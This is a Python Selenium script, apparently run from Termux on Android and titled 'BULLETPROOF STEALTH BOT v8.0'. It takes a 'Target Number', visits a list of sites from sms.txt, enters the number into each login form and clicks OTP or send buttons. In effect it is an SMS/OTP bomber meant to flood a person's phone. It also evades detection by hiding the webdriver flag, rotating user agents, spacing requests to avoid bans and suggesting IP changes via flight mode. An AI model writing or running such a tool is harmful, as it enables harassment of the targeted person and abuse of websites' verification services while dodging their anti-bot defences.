import time
import os
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

# --- CONFIG ---
SMS_FILE = "sms.txt"
success, failed = 0, 0

def create_driver():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    # Real Mobile User Agent
    ua_list = [
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.71 Mobile Safari/537.36"
    ]
    options.add_argument(f"user-agent={random.choice(ua_list)}")
    
    service = Service('/data/data/com.termux/files/usr/bin/chromedriver')
    try:
        driver = webdriver.Chrome(service=service, options=options)
        # --- STEALTH: REMOVE BOT FOOTPRINT ---
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": """
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                window.chrome = { runtime: {} };
            """
        })
        driver.set_page_load_timeout(60) # High timeout for slow 4G
        return driver
    except: return None

def attempt_action(driver, site, mobile):
    try:
        # Step 1: Wait for any input box (Smart Wait)
        time.sleep(10) # 4G ke liye zyada wait
        
        # Swiggy/Zomato special handling
        if "swiggy" in site or "zomato" in site:
            driver.execute_script("window.scrollTo(0, 500);")
            time.sleep(2)

        # Step 2: Input search
        m_box = None
        inputs = driver.find_elements(By.TAG_NAME, "input")
        for i in inputs:
            attr = str(i.get_attribute("outerHTML")).lower()
            if any(k in attr for k in ["tel", "mobile", "phone", "number"]):
                if i.is_displayed():
                    m_box = i; break
        
        if not m_box:
            # Login button click logic
            buttons = driver.find_elements(By.TAG_NAME, "button")
            for b in buttons:
                if any(k in b.text.lower() for k in ["login", "sign", "otp"]):
                    driver.execute_script("arguments[0].click();", b)
                    time.sleep(5); break
            
            # Re-check for box
            inputs = driver.find_elements(By.TAG_NAME, "input")
            for i in inputs:
                if "tel" in str(i.get_attribute("type")): m_box = i; break

        if m_box:
            m_box.clear()
            m_box.send_keys(mobile)
            time.sleep(2)
            
            # Step 3: Click Submit
            btns = driver.find_elements(By.TAG_NAME, "button")
            for b in btns:
                if any(k in b.text.lower() for k in ["otp", "continue", "login", "send"]):
                    driver.execute_script("arguments[0].click();", b)
                    time.sleep(5)
                    return True
    except: pass
    return False

def attempt(site, mobile):
    global success, failed
    driver = create_driver()
    if not driver: return
    try:
        driver.get(site)
        if attempt_action(driver, site, mobile):
            print(f"[+] SUCCESS: {site}")
            success += 1
        else:
            print(f"[-] FAILED: {site}")
            failed += 1
    except:
        print(f"[!] TIMEOUT (Slow Net): {site}")
        failed += 1
    finally:
        driver.quit()

def main():
    os.system("clear")
    print("========================================")
    print("    🔥 BULLETPROOF STEALTH BOT v8.0     ")
    print("========================================\n")
    
    target = input("Enter Target Number: ")
    if not os.path.exists(SMS_FILE):
        print("sms.txt not found!"); return
        
    with open(SMS_FILE, "r") as f:
        links = [l.strip() for l in f if l.strip()]

    print(f"\n[*] Running on {len(links)} sites. Flight Mode trick recommended.\n")
    
    for link in links:
        attempt(link, target)
        time.sleep(3) # Anti-ban gap

    print(f"\n--- DONE | SUCCESS: {success} | FAILED: {failed} ---")

if __name__ == "__main__":
    main()
